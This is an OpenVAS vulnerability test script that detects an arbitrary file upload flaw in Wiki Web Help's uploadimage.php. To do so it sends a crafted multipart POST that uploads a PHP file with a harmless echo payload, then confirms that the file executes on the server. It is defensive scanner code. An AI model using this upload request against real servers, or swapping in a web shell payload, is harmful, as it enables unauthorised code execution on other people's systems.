###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wikihelp_41309.nasl 14323 2019-03-19 13:19:09Z jschulte $
#
# Wiki Web Help 'uploadimage.php' Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100702");
  script_version("$Revision: 14323 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:19:09 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-07-06 13:44:35 +0200 (Tue, 06 Jul 2010)");
  script_bugtraq_id(41309);
  script_tag(name:"cvss_base", value:"4.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
  script_name("Wiki Web Help 'uploadimage.php' Arbitrary File Upload Vulnerability");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"The vendor released a patch. Please see the references for more
  information.");
  script_tag(name:"summary", value:"Wiki Web Help is prone to an arbitrary-file-upload vulnerability
  because it fails to properly sanitize user-supplied input.

  An attacker may leverage this issue to upload arbitrary files to the
  affected computer, this can result in arbitrary code execution within
  the context of the vulnerable application.

  Wiki Web Help 0.2.7 is vulnerable, other versions may also be
  affected.");
  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/41309");
  script_xref(name:"URL", value:"http://sourceforge.net/tracker/?func=detail&atid=1296085&aid=3025530&group_id=307693");
  script_xref(name:"URL", value:"http://sourceforge.net/projects/wwh/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

foreach dir( make_list_unique( "/wwh", "/wikihelp", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.html";
  buf = http_get_cache( item:url, port:port );
  if( buf == NULL )continue;

  if( "<title>Wiki Web Help</title>" >< buf ) {

    host = http_host_name( port:port );

    rand = rand();
    file = string("OpenVAS_TEST_DELETE_ME_", rand, ".php");

    len = 175 + strlen(file);

    req = string(
        "POST ", dir, "/handlers/uploadimage.php HTTP/1.1\r\n",
        "Content-Type: multipart/form-data; boundary=----x\r\n",
        "Host: ", host, "\r\n",
        "Content-Length: ",len,"\r\n",
        "Accept: text/html\r\n",
        "Accept-Encoding: gzip,deflate,sdch\r\n" ,
        "Accept-Language: en-US,en;q=0.8\r\n",
        "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n\r\n",
        "------x\r\n",
        'Content-Disposition: form-data; name="imagefile"; filename="',file,'"',"\r\n",
        "Content-Type: application/octet-stream\r\n\r\n",
        "<?php echo '<pre>OpenVAS-Upload-Test</pre>'; ?>","\r\n",
        "------x--\r\n\r\n");
    recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);

    if("{'response':'ok'}" >!< recv)continue;

    url = string(dir,"/images/",file);

    if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-Upload-Test")) {
      report = string(
        "Note :\n\n",
        "## It was possible to upload and execute a file on the remote webserver.\n",
        "## The file is placed in directory: ", '"', dir, '/images/"', "\n",
        "## and is named: ", '"', file, '"', "\n",
        "## You should delete this file as soon as possible!\n");
      security_message(port:port,data:report);
      exit(0);
    }
  }
}

exit( 99 );
